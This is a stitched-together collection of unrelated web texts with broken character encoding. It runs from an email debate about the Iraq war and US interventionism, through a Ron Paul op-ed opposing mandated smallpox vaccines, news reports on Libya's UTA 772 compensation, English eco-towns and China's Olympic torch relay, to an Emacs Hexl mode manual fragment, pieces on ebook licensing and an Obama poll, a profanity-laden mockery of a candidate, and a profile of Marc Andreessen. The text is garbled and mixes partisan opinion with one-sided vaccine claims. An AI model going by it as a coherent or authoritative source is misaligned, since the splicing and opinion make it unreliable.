The nationalist Sunni and Shia Arabs are called the insurgency and the death squads and are marginalized .
( I know Sadrâ€™s guys are murderers , but they are no worse that the Iran - backed SCIRI / Badr / Daâ€™wa factions who we call the â€œIraqi governmentâ€  and the Sunni insurgency is now on the payroll – temporarily . )
The only thing â€œwrongâ€ with Sadr really is that he wants to form a nationalist alliance with Iraqi Sunnis and insists on U.S. withdrawal .
â €“ Right ?
I do realize that part of your cause is to ensure civil liberties as well .
I know that bills such as the Patriot Act are controversial and very unfair to average people trying to live their lives .
I am very skeptical of these plans as well .
â €“ Iâ€™m a real stickler for the Constitution and Bill of Rights .
If the Constitution isnâ€™t the law , then what binds the power of our government ?
They are forbidden from searches without warrants .
Period .
If the Patriot Act is worth it , then repeal the 4th amendment .
I see both sides of the argument .
But I chose the opposite side of the fence on the issue than you did .
Just like how I chose to put my life on the line for the country and you chose to stay and home and write about the mistakes I am making .
â €“ Well , I think the mistakes are being made mostly by the civilian policy makers at the think tanks in Washington and New York and then implemented by some of your higher ups .
Admirals Fallon and Mullen deserve a great deal of credit for telling Bush / Cheney hell no on war with Iran .
I believe they stopped it .
Whenever I get into a discussion of this nature I always listen to the other person make their point and ask a simple question .
So I ask you now .
What , in your opinion , would be the most effective strategy to conclude this war ?
â € “ I really appreciate the honesty of this debate .
It has been of a far higher standard than much of the email we get .
â €“ Alright , short question , long answer :
â €“ We have to understand what Ron Paul has been telling us : that the founders were right that we had to leave the world alone .
No entangling alliances .
Not an appeal to authority , but to their wisdom .
When we intervene in wars there are always consequences .
Often the consequences are used to justify the next war .
We should only fight in our own defense , never for other countries interests in order to minimize these consequences ( dead , wounded , inflation , taxation , lost liberty , new enemies , etc ) .
â €“ Woodrow Wilson betrayed Washington and Jefferson when he got us into World War I ( then known as The War to End All Wars ) .
Because of this , the groundwork was set for the Commies to seize power in Russia and the Nazis in Germany .
Also due to the American intervention the Brits got to steal the Middle East from the ashes of the Ottoman Empire .
â €“ In WWII we intervened to save the Brits and the Soviets from the Nazis .
At the end , we inherited the empires of the British , French , Dutch , Germans and Japanese and accepted it all in the name now of containing the Soviets we had saved .
Soon came a coup in Iran because of the democratic election of Mossedeq who leaned toward the Reds. 26 years later the people of Iran rose up and overthrew the U.S. backed dictator and got the Ayatollahs in his place .
Right around the same time , the U.S. started backing the mujahedeen in Afghanistan against our old friends the Soviets and Saddam Hussein in Iraq in order to contain the Iranian revolution .
â €“ When the Soviets fell and Hussein got too big for his britches , we put bases in Saudi from which to bomb Iraq from 1991 through the present day .
This is what angered our old friends the mujahedeen and gave them common cause for their jihad .
Result : September 11th .
â €“ Now we have regime changes in Afghanistan , Iraq and Somalia with consequences unknown on their way down the line ( Iran ?
Kurdistan ?
Pakistan ?
Saudi ? Sudan ? )
The lesson here is that at some point we have to just kick the damn habit .
Wars do not , in fact , prevent the next war , they cause them .
â €“ Al Qaeda remains a threat that must be dealt with .
Hereâ€™s how :
As one former CIA officer has said , â€ œRamp this whole thing down .â€ 
It is not conceding to the terrorists for the U.S. to do what is right anyway .
We should announce to the world that despite what they may have been led to believe by some of our bad policies recently that we are not an empire , that we are proud of our heritage of independence from empire , we only wanted to protect â€˜em , but were doing it wrong , that we intend to leave Iraq as quickly as logistically possible , that we have no desire for war with Syria or Iran ( both are avowed enemies of al Qaeda ) and will be sending ambassadors to open embassies in those countries immediately , and we should insist firmly , as we withdraw our empire , on cooperation from all regional national governments to find bin Laden and his top few hundred followers .
They should be captured and brought to America for trial – RICO and anti-terrorism statutes should cover it .
Those who can not be brought in alive should be blasted .
â €“ If this had been the policy all along , the entire war on terrorism would have been over by June 2002 .
Qaeda ainâ€™t no Soviet Union .
They donâ€™t even own a single county on earth .
They are dangerous to civilian lives in our country , but they in no way pose an existential threat to our country itself .
One division of Marines could handle this problem once and for all , Iâ€™d bet .
And then we should go back to being a limited constitutional republic before itâ€™s too late .
â €“ By the way , donâ€™t buy Bush line that it is new to have enemies who can strike across the ocean at us and that the foundersâ€™ advice doesnâ€™t apply today .
Back when the founders gave their advice , the Brits and French occupied Canada and Louisiana right on our borders and had the most powerful armies and navies in the world .
I look forward to your response .

Iâ€™ll tell you right off the bat that I appreciate your complement .
At the same time I should tell you that you arenâ€™t half as shallow as I thought you might be .
You also have well formed opinions , although I may disagree .
You can consider that a compliment , as reluctant as it sounds .
Trust me when I say that it is .
I have been approached by my share of ignorant and nonsensical individuals who canâ€™t contemplate the breadth of the situation that we are dealing with .
Itâ€™s ridiculous at times and I have to walk away laughing because there is no chance for an intelligent discord .
So I give you credit for that .
But donâ€™t break out the party hats too soon !
Iâ€™m not done yet .
Thereâ€™s a topic that I want to hit first because it kind of made me laugh when I read what you wrote .
It is the part where you are presenting your withdrawal strategy .
Basically scale down the offensive forces in Iraq and send a Marine RCT into Afghanistan to flush and and capture / kill the enemy .
Do I pretty much have that summed up ?
Well , the irony is , That is EXACTLY what General Conway proposed to the Joint Chiefs .
Iâ€™m sure you read about it .
His proposal was to withdraw the Marines completely from Iraq , ( because we arenâ€™t designed or intended to be an occupation force anyway ) and send us to Afghanistan and take care of the problem once and for all .
Meanwhile the army would withdraw itâ€™s forces from Afghanistan and focus on aiding in the rebuilding the Iraqi infrastructure and training Iraqi security forces while scaling back troop strength .
Well ,
The plan got shot down .
Itâ€™s too bad because Iâ€™m pretty sure it would work .
They want to keep NATO in there .
â €“ Ha !
You know , I had forgotten about that .
Thanks for reminding me !
Am I a regular strategic genius or what ? : )
Thatâ€™s another thing that has become a common complaint among Marines .
We are an expeditionary force .
We are intended to be employed as a force in readiness capable of rapid deployment worldwide .
Now , of course , I have my rivalry with the army .
That rivalry has existed for many , many generations , dating all the way back to the very founding of the Marine Corps , which occurred three months after the formation of the army in 1775 .
But I think that it is safe to say that the army is better suited for the occupation of Iraq .
Albeit a progressive reduction in forces .
Not to mention that the situation in Iraq has made vast improvements over the last year since I was there .
Mostly in Al Anbar , where the Marines control .
But it is commonly viewed by the Corps as a whole that we are not needed over there anymore .
I would like to see us take up our position again as the quick reaction force that we are designed to be .
Marines out is a good first start .
There is no need to attempt to educate me on the political ties that we share between certain groups that hold power in Iraq .
Here it is plain and simple .
We work with the first insurgent organization who is willing to cooperate .
We form these alliances knowing full well that we were fighting them last week !
I will give you an example .
The Iraqi division that we were partnered up with , had an old crusty Sergeant Major .
He spoke pretty good English so I was asking him about his history .
He was 36 years old and had been in the Iraqi army for 24 years .
Got his start in the Iran - Iraq war in the 80 â €™s when he was a kid .
He fought us in â€˜91 .
Inevitably , he fought us again during the invasion .
But there we were , a couple of patriots just having a smoke and talking military life .
In , fact he told me that over half of the Iraqi soldiers that we had with us had fought against us during the initial push .
Many had become insurgents after the Iraqi military defeat .
But they were persuaded to join the army and do the right thing instead of killing the wrong people .
Now , I donâ€™t know whoâ€™s logic it was that decided these alliances but the truth is clear .
We had to start getting these groups on our side of the table before we could discuss negotiations .
Iâ€™ll tell you another story .
There was this one section of road through the city that we always got attacked on .
Usually sniper fire or a small IED buried in the dirt next to the road .
Anyway , I made friends with one of the local community leaders .
In fact most of that stretch of road was his extended family .
We were bringing him back to the FOB to talk to him and our truck got hit with an IED .
The trigger man misjudged and blew it early so it was mostly superficial damage .
Well , we took care of him and talked to him for a while .
We bring him back later on and to this day , there hasnâ€™t been an attack on that stretch of road .
Understand , Iâ€™m not telling you stories because I like to wave my ego flag .
Iâ€™m communicating a few things to you .
I donâ€™t know if you have ever served in an infantry unit in combat or not .
Iâ€™m just explaining to you my appreciation of certain issues and how it directly relates to the subject at hand .
â €“ No , Iâ€™ve never been in the military .
That is interesting , but , no offense intended , Iâ€™m afraid I donâ€™t really understand what youâ€ ™re getting at there .
Now , I have seen you write â€ ˜American Empireâ€™ in some form or another , a few times .
Is that to say that you think that a forward deployed , operationally ready military force should be abandoned ?
Should we isolate ourselves and put blinders on to any injustices occurring in the outside world ?
That is the impression I get .
Thatâ€™s alot like a â€˜itâ€™s none of my businessâ€™ attitude .
Being the worldâ€™s truly , lone superpower I feel that we owe civilization a bit more than that .
The United States as a whole probably throws away more food in one day than Africa eats !
But Iâ€™m not interested in talking about Africa .
So donâ€™t bring it up .
It has nothing to do with me not caring .
â €“ An operationally ready military force is fine with me .
Forward deployed is not .
I think the fact that we are the most powerful nation is all the more reason that we should lead by example and show the world that we believe empires are immoral and that we mean to keep our constitutional republic and that if they want to be badass like us , they should embrace liberty too .
I also believe that private citizens should be allowed to intervene if they want – such as U.S. pilots who volunteered to fight the Germans for England before Pearl Harbor .
If you want to be a peacekeeper in a humanitarian crisis , thatâ€™s fine , but I think it is a mistake to expect government to ever get these things right and wrong to tax your neighbor for any reason other than basic mutual defense .
â €“ Like I was saying last night , here we are 90 years later still fighting Wilsonâ€™s War .
Intervention just doesnâ€™t work .
The worst humanitarian crisis in the world right now is Iraq – caused , not prevented , by U.S. intervention .
You are right that this war has been a massive financial drain on our economy .
There is no disputing that .
Money could be spent elsewhere .
But you seem to be stuck in the past .
Sure , we would be a lot better off financially if we didnâ€™t have to fund such an expensive campaign .
But guess what ?
It happened .
So now is the time to look towards the future and make the right choices .
â €“ Well the past is only prologue , but it isnâ€™t that I want to go backwards so much as I want to get the lessons right so that as we go forward , we go in the right direction .

The only point that I want to dispute you on at this time is the issue of forward deployed forces .
Iâ€™m not going to quote you because you know what you wrote .
I understand your concept and agree that it would be an IDEAL function of our military .
However , what you speak of is a utopian society that does not exist in this world .
You have to realize that our military , especially the Navy and Marine Corps , our forward deployed to be used as a deterrent force at times .
If we didnâ€™t have the presence in more volatile parts of the world , things would be far worse I assure you .
We have treaties with nations who allow us to occupy small areas of their sovereignty in order to project their interests politically as well .
Take Japan for example .
The United States , most notably the Marines , have a major base on the island of Okinawa .
But , we have to pay for it .
This is the result of an agreement that was reached to promise the Japanese a lack of imperialism on our part .
Imagine the lack of even the threat of a superior force in places like Somalia and Israel .
This world would be in a frenzy if there wasnâ€™t some sort of balancing power .
Iâ€™m sure you donâ€™t view our projected power as such but take a step back and imagine what the world would look like if we werenâ€™t here .

â €“ There is nothing whatsoever that is utopian about my view .
If anything , you are the one who is choosing to ignore 100 years of chaos spread by American intervention in your belief that somehow there will come a point where things are great .
This is simply not true .
We back dictatorships all over the world and those bases you talk about – more than 750 of them in more than 130 countries – are what causes people to hijack planes and kill Americans , as weâ€™ve already established .
â €“ Think of it this way .

Government Vaccines — Bad Policy , Bad Medicine
by Rep. Ron Paul , MD
" Simply put , it is not ethical to give a medicine that will kill and maim persons for no demonstrable benefit .
Assuaging fears about vulnerability to a potential disease is not a benefit any physician should accept . "
~ Dr. Jeffrey S. Sartin , MD
A controversy over vaccines , specifically the smallpox vaccine , is brewing in Washington .
The administration is considering ordering mass inoculations for more than one million military personnel and civilian medical workers , ostensibly to thwart a smallpox outbreak before it occurs .
Yet dangerous side - effects from the vaccine — ranging from mild flu symptoms to gangrene , encephalitis , and even death — cause many to question the wisdom and need for such inoculations .
As a medical doctor , I believe mandated smallpox vaccines are bad medicine .
The available vaccine poses significant risks , even though the more serious complications affect only a statistically small number of people .
As with any medical treatment , these risks must always be balanced against the perceived benefit .
Remember , not a single case of smallpox has been reported , despite the near - hysteria that characterized recent news reports .
Even if some individuals became infected , smallpox spreads only with very close contact .
Those in the surrounding community could then decide to accept vaccines based on a much more tangible risk .
As a legislator , I believe mandated smallpox vaccines are very bad policy .
The point is not that smallpox vaccines are necessarily a bad idea , but rather that intimately personal medical decisions should not be made by government .
The real issue is individual medical choice .
No single person , including the President of the United States , should ever be given the power to make a medical decision for potentially millions of Americans .
Freedom over one ’s physical person is the most basic freedom of all , and people in a free society should be sovereign over their own bodies .
When we give government the power to make medical decisions for us , we in essence accept that the state owns our bodies .
The possibility that the federal government could order vaccines is real .
Provisions buried in the 500 - page homeland security bill give federal health bureaucrats virtually unchecked power to declare health emergencies .
Specifically , it gives the Secretary of the Department of Health and Human Services — in my view one of the worst of all federal agencies — power to declare actual or potential bioterrorist emergencies ; to administer forced " countermeasures , " including vaccines , to individuals or whole groups ; and to extend the emergency declaration indefinitely .
These provisions mirror those found in the Model Emergency Health Powers Act , a troubling proposal that was rejected by most state legislatures last year .
That Act would have given state governors broad powers to suspend civil liberties and declare health emergencies .
Yet now we ’re giving virtually the same power to the Secretary of HHS .
Equally troubling is the immunity from civil suit granted to vaccine manufacturers in the homeland security bill , which potentially could leave individuals who get sick from a bad batch of vaccines without legal recourse .
Politics and medicine do n’t mix .
It is simply not the business of government at any level to decide whether you choose to accept a smallpox vaccine or any other medical treatment .
Yet decades of federal intervention in health care , including the impact of third - party HMOs created by federal legislation , have weakened the doctor - patient relationship .
A free market system would allow doctors and patients to make their own decisions about smallpox inoculations , without the federal government hoarding , mandating , nor prohibiting the vaccine .
Instead , we ’re moving quickly toward the day when government controls not only what vaccines patients receive , but what kind of health care they receive at all .
Dr. Ron Paul is a Republican member of Congress from Texas .

170 people died when the UTA aircraft exploded over the Sahara
The award is payable to relatives of the seven US victims aboard UTA Flight 772 , and the aircraft 's American owner .
Libya has already agreed to pay $ 1 m compensation to the relatives of each of the 170 people on board the flight - but has denied any link to the bombing .
It paid compensation over a similar attack over Lockerbie in Scotland .
This award proves that the rule of law will always prevail over state - sponsored terrorism
Stewart Newberger , victims ' lawyer
Lawyers for the US victims of UTA 772 say Libya has until 25 February to decide whether to appeal against the order .
The huge award is made against Libya and six named officials .
It represents :
the value of the aircraft
compensation for the pain and suffering of the victims
compensation for the pain and suffering of the victims ' families
money the victims would have earned if they had lived
interest backdated to the day of the bombing .
Under American law , awards against individuals , though not the Libyan state , are tripled because it is a terrorism case .
" This award proves that the rule of law will always prevail over state - sponsored terrorism , " said Stuart Newberger , a lawyer for the victims ' families .
The seven US victims included Bonnie Pugh , whose husband Robert was then the US ambassador to Chad .
Sanctions lifted
The Lockerbie compensation deal was part of a package negotiated in secret for months .
It referred to the attack , in 1988 , that killed 270 people , including all those on the aircraft and others on the ground .
Under the deal , Libya restored its ties with the West by promising to renounce terrorism and its nuclear , chemical and biological weapons programmes .
In return , leading Western states ended Libya 's diplomatic isolation .
Colonel Gaddafi has opened up and been welcomed by the West
Sanctions were lifted , diplomatic relations restored , and high - profile visits and multi-million dollar trade deals followed .
But in the background , this latest compensation case was slowly making its way through the American courts .
Proceedings began in 2002 , and in April last year , a court ruled that Libya was directly responsible for the UTA bombing .
The plane was flying from Chad to Paris on 19 September , 1989 , when a bomb on a suitcase exploded over the Sahara .
All 170 people on board were killed .
Much of the evidence came from a criminal case in France , which in 1999 found Libya and the same six officials guilty of blowing up the aircraft .
Libya has refused to hand them over to France .
In August last year the US court sat for three days to hear evidence over the level of compensation , and the latest ruling is the result of that hearing .
Libya has not said whether it will appeal , but the American lawyers appear confident of getting the money .
They say that if Libya does not pay up , they will be able to get a court order to obtain it from American companies with which Libya is now doing business .
The shortlist of 15 sites will be trimmed down to 10 locations
The 15 locations shortlisted for the first new towns in England in 40 years have been revealed by the government .
Bordon , Coltishall , Curborough , Elsenham plus Ford in West Sussex have made the list , as well as Hanley Grange , Imerys , Leeds and Manby .
Marston Vale and New Marston in Bedfordshire , Middle Quinton , Pennbury , Rossington , Rushcliffe and Weston Otmoor make up the 15 .
The 10 sites for the " eco-towns " will be finalised in the next six months .
Ministers wants five of them built by 2016 , with the other half completed by 2020 .
The plans have proved controversial in some areas with campaigners saying the idea is a way to evade planning controls .
Most of the planned sites are expected to face local opposition , something thought to be worrying Labour strategists .
It 's tackling both the challenge of climate change and the need for more families to have a future in a home of their own
Caroline Flint , housing minister
Diagram of an eco-house Grant Shapps , the shadow housing minister , accused the government of " eco-spin rather than a genuine attempt to address the environmental nature of our housing " .
The new environmentally - friendly towns - low - energy , carbon - neutral developments built from recycled materials - will be the first new towns since the 1960s .
The largest will provide between 15,000 and 20,000 new homes , with officials saying the towns should be " zero - carbon " developments and should be exemplary in one area of sustainability , such as energy production or waste disposal .
They also want 30 % to 40 % of each eco-town to be allocated as affordable housing .
' Highest standards '
' ECO - TOWNS ' SHORTLIST

The plans : Site - by - site
The housing minister , Caroline Flint , said the new towns would help to tackle climate change , as well as providing affordable new housing .
" We have a housing shortage in this country and that 's why we need to build more homes , " she told BBC News 24 .
" But we also need to think about sustainable homes in sustainable communities . "
The shortlisted locations would have the potential to provide affordable housing and " the highest green standards we can expect for the way we want to live our lives in the future " , added Ms Flint .
" It 's tackling both the challenge of climate change and the need for more families to have a future in a home of their own . "
One of the 15 - Rossington in South Yorkshire - falls within her own Parliamentary constituency .
The government plans to form a panel of experts who will subject potential developers to tough tests before they win the right to build the towns .
Ms Flint said : " Bidders will have to meet the highest standards for sustainability , affordability and creativity .
This expert panel will challenge developers to the limits . "
The government is stressing that any new towns proposed will have to go through the normal planning process , and that local people and other interested bodies will have the right to challenge the plans .
It is reported the parents of tennis player Tim Henman have opposed the plan for the Weston Otmoor eco-town in Oxfordshire and have begun a campaign dubbed " Weston Front " .
Unless you do something about the existing stock , putting up a few eco - towns amounts to a tiny fraction of the total housing we will require
Grant Shapps , shadow housing minister
Eco towns : readers ' views Mr Shapps said the Conservatives would " always back plans for sustainable eco-communities " .
" But I 'm afraid there are several on this list which will cause immediate concern to local people because they 're being built on green fields , " he added .
" Of the housing we 'll be living in , halfway through this century , three - quarters of it is already built .
" Unless you do something about the existing stock , putting up a few eco - towns amounts to a tiny fraction of the total housing we will require . "
He also stressed the need to ensure inhabitants of new eco - towns did not have to commute in order to work .
If this happened , the sites would be " not that environmentally - friendly at all " , Mr Shapps said .
Pollution fears According to BBC environment analyst Roger Harrabin , eco-towns are a way of increasing housing in areas of England where demand outstrips supply .
They will also go some way to satisfying the demands of the powerful house - builders lobby , and will provide a laboratory for the sort of environmentally - conscious homes that ministers want to become the norm , he said .
But there are concerns among environmental campaigners that most of the proposed eco - towns will increase car pollution because they will not be big or diverse enough to sustain viable public transport .
Back to link Among 42 rejected locations were controversial sites in Hampshire , Oxfordshire and Derbyshire .
Micheldever Station , Grovewood in Derbyshire national forest and Shipton Quarry were some of the areas which failed to make the shortlist .
Most were on greenbelt land , threatened wildlife or were similar to projects previously denied planning permission .
The developments on the shortlist of 15 are to be built over the next decade , as part of the government 's plans for three million new homes by 2020 .
In September last year Prime Minister Gordon Brown announced that the number of towns to be built would be doubled from five to ten , because of the positive response to the original announcement .
He said it would help boost house - building to 240,000 homes a year .
The eco -town idea was the first major policy announcement made by Mr Brown as he began his campaign to succeed Tony Blair as prime minister last year .
It stemmed from a policy launched by former Deputy Prime Minister John Prescott two years earlier .

43 Editing Binary Files
There is a special major mode for editing binary files :
Hexl mode .
To use it , use M-x hexl - find - file instead of C-x C-f to visit the file .
This command converts the file ’s contents to hexadecimal and lets you edit the translation .
When you save the file , it is converted automatically back to binary .
You can also use M-x hexl - mode to translate an existing buffer into hex .
This is useful if you visit a file normally and then discover it is a binary file .
Inserting text always overwrites in Hexl mode .
This is to reduce the risk of accidentally spoiling the alignment of data in the file .
Ordinary text characters insert themselves ( i.e. , overwrite with themselves ) .
There are commands for insertion of special characters by their code .
Most cursor motion keys , as well as C-x C-s , are bound in Hexl mode to commands that produce the same effect .
Here is a list of other important commands special to Hexl mode :
C - M-d Insert a byte with a code typed in decimal .
C - M-o
Insert a byte with a code typed in octal .
C - M-x
Insert a byte with a code typed in hex .
C - M-a
Move to the beginning of a 512 - byte page .
C - M-e
Move to the end of a 512 - byte page .
C-x [
Move to the beginning of a 1 k - byte page .
C-x ]

M-j
Move to an address specified in decimal .
C-c C-c Leave

Reporting on a Science and Technology Law Review article about copyright and ebooks , Gizmodo 's Matt Buchanan has written a great piece on the way that hardware ebook readers ( Kindle , Sony Reader ) run on stores that only license — instead of selling — books to you , even though they encourage you to think of the books as a purchase , saying things like " buy it now for the Kindle ! "
Books that you own can be loaned , re-sold and given away , and the ongoing health of the book trade and reading itself relies on this — how many of your favorite writers did you discover at a used bookstore , or when a friend passed you a copy of a book ?
It 's funny that in the name of protecting " intellectual property , " big media companies are willing to do such violence to the idea of real property — arguing that since everything we own , from our t- shirts to our cars to our ebooks , embody someone 's copyright , patent and trademark , that we 're basically just tenant farmers , living on the land of our gracious masters who 've seen fit to give us a lease on our homes .
In the fine print that you " agree " to , Amazon and Sony say you just get a license to the e-books –you 're not paying to own 'em , in spite of the use of the term " buy . "
Digital retailers say that the first sale doctrine –which would let you hawk your old Harry Potter hardcovers on eBay–no longer applies .
Your license to read the book is unlimited , though–so even if Amazon or Sony changed technologies , dropped the biz or just got mad at you , they legally could n't take away your purchases .
Still , it 's a license you can't sell .
But is this claim legal ?
Our Columbia friends suggest that just because Sony or Amazon call it a license , that does n't make it so .
" That 's a factual question determined by courts , " say our legal brainiacs .
" Even if a publisher calls it a license , if the transaction actually looks more like a sale , users will retain their right to resell the copy . "

The tumultuous reception to China 's Olympic torch relay around the world has touched a nationalistic nerve here , where heavily censored reports about Tibet and other topics at hand have left many wondering why China is under attack from foreign critics .
" It 's just bad , bad , bad , " retired army officer Wang Guanghai said of pro-Tibetan demonstrations that marred the torch relay in London and Paris .
Wang , who chatted at a fruit stand in a downtown Beijing neighborhood , said he was certain the United States would be more welcoming when the torch arrived in San Francisco .
Although protesters had hung pro-Tibetan freedom banners from the Golden Gate Bridge hours earlier , the news had not been published in China .
A middle - age woman surnamed Feng was less optimistic about the U.S. reception and less willing to give her full name .
Feng , who did not want to give her first name , said the tension was noticeable among guards in the embassy district where she walks her dog .
She said she expects China 's international reception to continue to be rocky as the torch moves around the world .
" The ( Chinese ) government is worried ; we 're all worried , " Feng said .
" We 've been preparing for these Olympics for eight years . "
On the Internet , there is more indignation over disruptions of the torch relay .
But gauging public opinion in China on sensitive issues like Tibet and human rights is close to impossible , and as elsewhere , the loudest voices attract the most attention .
Instead , political discourse is funneled via Internet controls toward nationalism , with popular news and chatter filled with patriotic sentiment .
During the Chinese crackdown on Tibet last month , Web users reported that any comments critical of the government 's handling of the turmoil or supportive of Tibetan rights were deleted shortly after being posted .
Regarding the torch run , page after page of comments on popular Web sites railed against China 's foreign critics in general and against the international media in particular .
CNN has become a favorite target , after government - run newspapers highlighted blogs critical of how the network cropped a photograph of demonstrations in Tibet .
The Web site www.anti-CNN.com says it has received 400,000 hits since it opened a few weeks ago .
" In London , in Paris , many protesters are Westerners , " said one commenter on www.china.com.
" They 've never been to China but are still against China because they do n't want to see China develop . "
Sebastian Veg , a researcher with Hong Kong 's French Centre for Contemporary Research on China , noted that not all voices are alike .
More than two dozen high - profile intellectuals and lawyers criticized the government 's actions on Tibet in an open letter last month .
Domestic newspapers like Southern Weekend , noted for its investigative reporting , have not toed the government line .
" There is clearly a group of very vocal nationalists who resent foreign criticism of China , " Veg said .
" These people both want to express themselves and are allowed to express themselves . "
He compared the nationalistic outcry in China to similar movements in the United States and France in recent years .
" I would say China is probably not very different , and people can be led to say silly things when they see their politicians doing the same , " Veg said .
The view of the torch run from within China has been censored heavily and intended to discredit protesters as a small group of anti-China malcontents .
Initial protests by Reporters Sans Frontiers at the torch lighting ceremony in Athens went unreported by Chinese press for several days , and the disruptions in London were downplayed dramatically .
The English - language China Daily newspaper described London 's upheaval in the streets as " disruptions by a few Tibetan separatists and their supporters . "
In the first reports from Paris by the state - run Xinhua news agency , the journalist cited " technical difficulties " as the reason the torch was extinguished and carried on a bus rather than by someone on foot .
A day later , a spokesman for the Beijing organizing committee of the Olympics told a hastily called news conference that though the relay had been disrupted , China intended to complete the longest torch run in the history of the Games .
Dissenting voices have been silenced even more than usual , so it 's even tougher than in normal times to gauge popular opinion .
But censorship in China begins early and political debate is limited , so to many the torch demonstrations seem like overblown personal attacks against Chinese people , not just criticism of their government .
Sophie Richardson , Asia director for Human Rights Watch , said the dangers of China 's heavy - handed censorship are evident .
" The downside of suppressing free information and substituting propaganda is quite clear , be it about toxic toys or repressed ethnic minorities - the eventual eruption is far worse than it might have been had it been dealt with openly , " Richardson said .
" As long as China blocks the free flow of information , it is unreliable as a trading partner , as a strategic partner or as a ' responsible power . ' "
So as John McCain and Barack Obama drone on about policies , issues and other tedium , we 'd like to take a moment to celebrate the craziest bastards who have run for -- and even freaking won -- public office .
With the presidential election looming , we 've reached a point where all of the craziest candidates have been filtered out of the process .
Larry Kilgore
Larry Kilgore , coming off a run for the US Senate in Texas , is what some people might call insane .
Certifiably insane .
Like " will eventually wind up in a bell tower with a rifle " insane .

Running on a platform that hopes to see Texas gain independence from the US , Kilgore takes all his cues from the Old Testament .
As such , he believes people such as adulterers and homosexuals should be put to death .
Oh and they 'll be killed within 24 hours of conviction .
Lest you think yourself free from Kilgore 's frothy - mouthed wrath , he also has flogging listed as a punishment for " lesser " crimes .
In fact , he says this on his website :
Quote Judges will flog those convicted of fornication ; of public use of vulgar sexual and excretory language ; of sexually suggestive dress or behavior ; of intoxication ; and of possession of pornography .
Judges will flog more severely those convicted of transvestism ; of public nudity ; and of distributing pornography .
And judges will flog more severely still those convicted of prostitution ; of producing pornography for any use ; and of sexual acts in public places

The fact that he 's basically set up the entire judiciary to spend 40 hours a week handing out non -stop beatings to a good 90 percent of the country until they all have to go on disability with severe tennis elbow does n't seem to be a concern to him or the 225,897 people who voted for him last time he ran .
Fear not for there 's apparently some wiggle room in all of this , because he admits on his very own site that he 's repented for watching porn on both the internet and TV with no mention of being beaten .
On the plus side , it looks like being a fuckstick of divine proportions is n't a floggable offense so he 's clear on that count .

A new Newsweek poll was released today that showed 40 % of those surveyed now have a negative opinion of Democratic presidential candidate Barack Obama , and 41 % said that Obama was being hurt by Rev. Wright .
Not the poll , itself , but the way that it is being reported is a fine case of negative journalism .
Some news outlets have pointed to the fact that 24 % of those surveyed said that they thought Obama was an elitist .
What they do n’t bother to mention is that 56 % of those asked felt that he was down to earth .
The survey was split on Obama ’s “ bitter ” comment .
42 % of those asked said it made them view him less favorably , and 42 % said that it made no difference .
It is fair to say from this result that his comments did n’t help him , but I personally still think that any damage they might cause him will limited to Pennsylvania .
People did respond by a margin of 52 % - 29 % that it did n’t make any difference to them if Obama did n’t wear a flag pin .

A problem for Obama is that he still ca n’t get rid of the idea that he is a Muslim , 52 % of those surveyed said that he is n’t a Muslim , but 26 % did n’t know what he was and 13 % were n’t sure .
That means that 39 % of those asked either had no idea , or the wrong idea about him .
This is a fertile group that the GOP will be looking to exploit this fall .
These same 39 % were also asked about Obama ’s former PASTOR Rev. Wright .
How stupid can a group of people be to question a man ’s religion when they are asked about his pastor ?
On the Wright question , 46 % of those asked said that Obama ’s relationship with Wright made no difference , and 41 % said that it made them view him less favorably .
It is natural for a frontrunner ’s negatives to go up .
Obama is not perfect , and some people will not support him .
The media is playing up all the negatives in these numbers , and ignoring the one real problem Obama has .
It seems that his campaign has the overestimated the intelligence of a portion of the American electorate .
They need to pound it into people ’s heads once and for all that Barack Obama is a Christian , not a Muslim , before Barack finds himself Swiftboated this fall .
Newsweek poll :
http://www.newsweek.com/id/134254?tid=relatedcl
( Fortune Magazine ) -- I would like to apologize in advance to the New York Times for getting Marc Andreessen so worked up .
That was not my intention when I met him for lunch the other day .
AOL had just announced that it would no longer support Netscape , the ur - browser that Andreessen co-wrote back when the web was young .
I wanted to know how he felt about his first baby , now that it 's been taken off life support and is destined to die just shy of its 14th birthday .
" I do n't want to talk about it , " he says , settling into his window seat at Hobee 's , a chain restaurant near Stanford University where he 's such a familiar face that he 's served iced tea with lemon without having to order it .
Like me and everybody else I know , he stopped using Netscape years ago .
In fact , he 's a major investor in Flock , a competing " social browser " that 's designed to work seamlessly with blogs and web services like Flickr and Facebook .
That 's typical Andreessen , the once and future king of the startup guys :
Move fast , do n't look back , put your faith in the open market , and trust that the fittest will prevail .
So how does the Times figure into this ?
When I mentioned its dismal earnings and casually suggested that one way to save the paper and the social good it provides - call me crazy , but I want a base line for news - would be for some rich guy to ride in and set up a trust to protect it , he blew a gasket .
" My company does good for the world , " he growled .
" Why does n't someone protect it ? "
Then he went back to his computer and launched a kind of fatwa that was immediately broadcast in the echo chamber of the blogosphere .
" I ca n't take it anymore , " he wrote on his blog ( blog.pmarca.com ) .
" I hereby inaugurate my New York Times Deathwatch , which will continue until the last Sulzberger has left the building . "
The piece goes on to rip apart the Times ' business strategy top to bottom , attacking everything from the techno - illiteracy of its board of directors ( which boasts experts in marsupials and snack cakes but almost no expertise in the Internet ) to its recent per-copy price hike .
" When you have an obsolete , inconvenient physical product that nobody wants in an era of universal online access , the appropriate strategy is clearly to raise the price , " he snarked .
( He 's not the only one gunning for the Times .
A coalition of hedge funds just bought up 10 % of the company and wants to install four of its own candidates on the board . )
Andreessen has always been a blunt , plainspoken guy .
He grew up in a tiny town in Wisconsin , and although he moved to California in 1993 to make his fortune , he maintains a Midwestern intolerance for pretense ( and , apparently , fancy lunch spots ) .
He 's a legend in Silicon Valley for having founded and sold , by age 36 , two billion - dollar companies : Netscape Communications ( unloaded on AOL ( TWX , Fortune 500 ) in 1998 for $ 4.2 billion ) and Opsware ( a server - management company that HP ( HPQ , Fortune 500 ) bought last year for $ 1.6 billion ) .
Now he 's going for a three - peat :
He 's co-founder and chairman of Ning , which makes tools to help users start their own social networks .
His timing was perfect .
Ning was launched just as the MySpace - Facebook phenomenon was taking off , and by last fall it had created more than 100,000 mini social networks - for everything from high school reunions to Hugh Hefner 's " college - only non-nude " Playboy U .
But Andreessen keeps circling back to the media business .
I used to think he was obsessed because his browser stuck a shiv in old media , but it goes back further than that .
One of his first hacks as an undergrad at the University of Illinois in 1992 was diverting cable to his SGI workstation so that he could watch CNN .
Most of the 30 investments he 's made since are in media - related startups .
Today , to his great delight , he has become a media player - not through his investments but through his blog .
He 's on my short list of daily must - reads , and his postings are regularly picked up by Techmeme , a minute - to - minute hot list of what people who love digital technology are reading .
So what would he do if he were running the Times ?
Easy , he says .
Kill the print product immediately and deliver the base line of news online only .
